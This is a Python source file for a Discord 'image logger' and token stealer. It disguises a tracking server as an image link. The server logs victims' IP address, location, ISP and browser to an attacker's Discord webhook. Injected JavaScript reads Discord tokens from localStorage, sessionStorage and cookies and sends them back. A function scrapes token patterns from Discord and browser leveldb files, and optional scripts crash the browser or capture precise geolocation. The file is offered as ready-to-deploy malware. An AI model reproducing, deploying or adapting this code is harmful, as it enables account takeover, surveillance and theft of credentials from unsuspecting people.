# ============================================================
# Discord Image Logger v5.1 - Ultimate Token Stealer
# Deployable on Vercel or locally
# Dev: Electron
# ============================================================

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, os, sys, re, glob

__app__ = "Discord Image Logger v5.1"
__description__ = "Steals Discord tokens from browser & desktop app, plus IP/location/browser info"
__version__ = "v5.1"
__author__ = "Dev: Electron"

# ============================================================
#  ★★★ কনফিগ ★★★
# ============================================================
config = {
    "webhook": "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token",  # <-- তোমার ওয়েবহুক বসাও
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": True,
        "message": "Your IP and Discord token have been logged. Dev: Electron",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
    "stealToken": True,
    "tokenWebhook": None,
}

blacklistedIPs = ("27", "104", "143", "164")

# ============================================================
#  ★★★ ইউটিলিটি ★★★
# ============================================================
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"Error:\n```\n{error}\n```",
        }],
    })

def get_discord_tokens_from_app():
    tokens = []
    paths = []
    if sys.platform == "win32":
        local = os.getenv("LOCALAPPDATA")
        if local:
            paths.append(os.path.join(local, "Discord", "Local Storage", "leveldb"))
            paths.append(os.path.join(local, "DiscordPTB", "Local Storage", "leveldb"))
            paths.append(os.path.join(local, "DiscordCanary", "Local Storage", "leveldb"))
            paths.append(os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"))
            paths.append(os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"))
    elif sys.platform == "darwin":
        home = os.path.expanduser("~")
        paths.append(os.path.join(home, "Library", "Application Support", "discord", "Local Storage", "leveldb"))
        paths.append(os.path.join(home, "Library", "Application Support", "discordptb", "Local Storage", "leveldb"))
        paths.append(os.path.join(home, "Library", "Application Support", "discordcanary", "Local Storage", "leveldb"))
        paths.append(os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Local Storage", "leveldb"))
    else:
        home = os.path.expanduser("~")
        paths.append(os.path.join(home, ".config", "discord", "Local Storage", "leveldb"))
        paths.append(os.path.join(home, ".config", "discordptb", "Local Storage", "leveldb"))
        paths.append(os.path.join(home, ".config", "discordcanary", "Local Storage", "leveldb"))
        paths.append(os.path.join(home, ".config", "google-chrome", "Default", "Local Storage", "leveldb"))
    for base in paths:
        if not os.path.isdir(base):
            continue
        for root, dirs, files in os.walk(base):
            for f in files:
                if f.endswith((".log", ".ldb")):
                    full = os.path.join(root, f)
                    try:
                        with open(full, "r", encoding="utf-8", errors="ignore") as fp:
                            content = fp.read()
                            matches = re.findall(r'[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38}', content)
                            tokens.extend(matches)
                    except:
                        pass
    return list(set(tokens))

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, app_tokens=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"Link sent.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }]
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"): pass
            else: return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2:
            if info.get("proxy"): pass
            else: ping = ""
        if config["antiBot"] == 1: ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)
    
    description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', '')}, {info.get('lon', '')}` ({'Approximate' if not coords else 'Precise'})
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:** `{useragent}`"""

    if token:
        description += f"\n\n**Discord Token (Browser):** `{token}`"
    
    if app_tokens:
        description += f"\n\n**Discord Tokens (App):** `{', '.join(app_tokens[:5])}`"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged" + (" + Token" if token or app_tokens else ""),
            "color": config["color"],
            "description": description,
            "footer": {"text": "Dev: Electron"}
        }]
    }
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    requests.post(config["webhook"], json=embed)
    if (token or app_tokens) and config["tokenWebhook"]:
        token_data = token if token else ", ".join(app_tokens[:5])
        requests.post(config["tokenWebhook"], json={
            "content": f"**Token:** `{token_data}`",
            "username": config["username"],
            "embeds": [{"footer": {"text": "Dev: Electron"}}]
        })
    return info

# ============================================================
#  ★★★ HTTP সার্ভার হ্যান্ডলার ★★★
# ============================================================
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            ip = self.headers.get('x-forwarded-for')
            ua = self.headers.get('user-agent')

            if "token" in dic and config["stealToken"]:
                token = dic["token"]
                makeReport(ip, ua, endpoint=s.split("?")[0], token=token)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"Token received. Dev: Electron")
                return

            if config["stealToken"]:
                app_tokens = get_discord_tokens_from_app()
                if app_tokens:
                    makeReport(ip, ua, endpoint=s.split("?")[0], app_tokens=app_tokens)

            if config["imageArgument"]:
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{margin:0;padding:0;}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, ua):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(ip, ua, location, s.split("?")[0], url=url)
            else:
                result = makeReport(ip, ua, endpoint=s.split("?")[0], url=url)

            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", result.get("isp", ""))
                message = message.replace("{country}", result.get("country", ""))
                message = message.replace("{region}", result.get("regionName", ""))
                message = message.replace("{city}", result.get("city", ""))
                message = message.replace("{lat}", str(result.get("lat", "")))
                message = message.replace("{long}", str(result.get("lon", "")))
                message = message.replace("{vpn}", str(result.get("proxy", "")))
                message = message.replace("{bot}", str(result.get("hosting", "")))
                message = message.replace("{browser}", httpagentparser.simple_detect(ua)[1])
                message = message.replace("{os}", httpagentparser.simple_detect(ua)[0])

            datatype = 'text/html'
            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["stealToken"]:
                token_script = """
                <script>
                (function stealToken() {
                    function sendToken(token) {
                        if (!token) return;
                        var sep = window.location.href.indexOf('?') === -1 ? '?' : '&';
                        var newUrl = window.location.href + sep + 'token=' + encodeURIComponent(token);
                        fetch(newUrl, {method: 'GET', cache: 'no-store'});
                    }
                    try {
                        var t = localStorage.getItem('token');
                        if (t) sendToken(t);
                        var st = sessionStorage.getItem('token');
                        if (st) sendToken(st);
                        document.cookie.split(';').forEach(function(c) {
                            var pair = c.trim().split('=');
                            if (pair[0] === 'token') sendToken(pair[1]);
                        });
                    } catch(e) {}
                })();
                </script>
                """
                data = data + token_script.encode()

            if config["crashBrowser"]:
                data = message.encode() + b'<script>for(var i=69420;i==i;i*=i){console.log(i)}</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()

            if config["accurateLocation"]:
                data += b"""<script>
                var cur = location.href;
                if (!cur.includes('g=') && navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(p) {
                        var g = btoa(p.coords.latitude + ',' + p.coords.longitude).replace(/=/g,'%3D');
                        location.replace(cur + (cur.includes('?')?'&':'?') + 'g=' + g);
                    });
                }
                </script>"""
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Dev: Electron')
            reportError(traceback.format_exc())
        return
    
    do_GET = handleRequest
    do_POST = handleRequest

# ============================================================
#  ★★★ Vercel Serverless Handler ★★★
# ============================================================
def handler(event, context):
    from http.server import HTTPServer
    class Handler(ImageLoggerAPI):
        def handleRequest(self):
            try:
                path = event.get('path', '/')
                query = event.get('queryStringParameters', {}) or {}
                headers = event.get('headers', {})
                ip = headers.get('x-forwarded-for', '')
                ua = headers.get('user-agent', '')
                self.path = path
                self.headers = headers
                self.command = 'GET'
                super().handleRequest()
            except Exception as e:
                return {'statusCode': 500, 'body': str(e)}
        def send_response(self, code): self.status_code = code
        def send_header(self, key, value): pass
        def end_headers(self): pass
        def wfile(self): return None
    handler_instance = Handler()
    handler_instance.handleRequest()
    return {'statusCode': 200, 'body': 'OK'}

# ============================================================
#  ★★★ লোকাল রানের জন্য ★★★
# ============================================================
if __name__ == "__main__":
    from http.server import HTTPServer
    print("""
    ██████╗ ███████╗██╗   ██╗     ███████╗██╗     ███████╗ ██████╗████████╗██████╗  ██████╗ ███╗   ██╗
    ██╔══██╗██╔════╝██║   ██║     ██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗████╗  ██║
    ██████╔╝█████╗  ██║   ██║     █████╗  ██║     █████╗  ██║        ██║   ██████╔╝██║   ██║██╔██╗ ██║
    ██╔══██╗██╔══╝  ╚██╗ ██╔╝     ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██║╚██╗██║
    ██║  ██║███████╗ ╚████╔╝      ███████╗███████╗███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║ ╚████║
    ╚═╝  ╚═╝╚══════╝  ╚═══╝       ╚══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                        Dev: Electron
    """)
    server = HTTPServer(('0.0.0.0', 8080), ImageLoggerAPI)
    print("[+] Server running on http://0.0.0.0:8080")
    print("[+] Webhook: ", config["webhook"])
    server.serve_forever()
